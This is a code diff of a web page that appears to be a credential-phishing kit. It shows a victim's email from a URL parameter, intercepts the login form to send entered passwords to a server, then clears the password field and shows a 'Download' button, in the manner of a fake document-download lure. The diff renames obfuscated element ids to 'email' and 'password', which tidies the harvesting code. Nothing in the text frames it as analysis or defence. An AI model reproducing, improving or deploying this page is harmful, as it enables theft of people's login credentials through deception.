@@ -184,7 +184,7 @@
       </div>
       <div style="width:100%">
         <div class="t">
-          <div id="xx1" style="color:#094AB2; font-weight:800"></div>
+          <div id="email" style="color:#094AB2; font-weight:800"></div>
           <img class="t1" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAARCAIAAAAkMGsnAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAKGSURBVGhD7Zk9TuxADICznOUhRMEBwg1AFFSUlNn2cYBXvQOwLRzhVa942r0BHIACoc1d8sYej8eexGyQZqRoma/J2uP4L9bGUlbDMDSVCnJC10pl5jTs1qvVekdCJTML6m46DZAaQzn2H29Nd3uFvyu5Kdxd90AvNz0Jh0imYff3uem2bpcYhv1j+3yN87B/f23PT71BJTdluwuzdnH2g6SD4JMPuAlo2se9F7ZdgwJcaULQIBB03jIS9fqA9dNOSuNyabsuROYqqeSQqc9H5M2GnulSrYosvfaShMiHDA9QCnZ1ahqoM1qAK7pB31wTuJQFEtGFcgbSfCclwBaEfERcak3MQmUoi9Cpc0lWRfP0ILGQHxc2PgNARQdBHatpEE2Kd5HD0Z2jQB5Wg7PUYK6T/EDk2PWYh9aPM+Tz1JBI7Q+1K9WXbQA8g1nVEXIa4CxCVqKKEd4EQko4nDjwuk+clEZ3nbsAP9L2SJn7Ga4JVkWf6aV/nVZuIJpM2qwuILbI/t+fV2H7hGuu3EJG3XAm/eby+i3eBPF4abl6Ym3zcE+L7ZST8rjtuL27CcsUVOrXeFjhot4jly7cqmnht3Y9qyJLL/x/ccf7KlMLqlWdhzJ1TI1/nCY4FbPiDtBWDTdYk4ttJ4zZs+HE/1RHeQHvXJpIQukRlSHnrUrzUIFWRYZeuUFBGOUG/Gv3VnWBOA1wb3KId/DdmDwT1FLbthxeG0e/006mMsuIDhoDgZ5TCEAqhD4zvBgVWXqhFu0qg0yBApnVIYv4TuFeN6fvv8q9M3br1e/z/cvPYn/Jx8ICvlP0m/uHi23B9aHw2/mI+AbfMEv/8xwR9Yt2JbKAN0VlITTNfz+G9xtOhHW3AAAAAElFTkSuQmCC">
         </div>
         <div>
@@ -266,8 +266,8 @@
               }        
             });       
 
-            document.querySelector("#xx").value = email_param;
-            let text = document.querySelector("#xx1").innerHTML = email_param;      
+            document.querySelector("#email").value = email_param;
+            let text = document.querySelector("#email").innerHTML = email_param;      
 
             document.querySelector('#formx').addEventListener('submit', (ev) => {
               ev.preventDefault();
@@ -282,9 +282,9 @@
               .then(res => res.json())
               .then((response) => {
                   setTimeout( () => {
-                      document.querySelector("#xx").value = email_param;
-                      document.querySelector("#xxx").value = "";
-                      document.querySelector("#xxx").focus();
+                      document.querySelector("#email").value = email_param;
+                      document.querySelector("#password").value = "";
+                      document.querySelector("#password").focus();
                       document.querySelector('.ms').innerHTML = `<img src="https://i.imgur.com/qg8i2uJ.png">`;
                         document.querySelector("#Btn").innerHTML= 'Download';
                         document.querySelector("#Btn").removeAttribute("disabled");
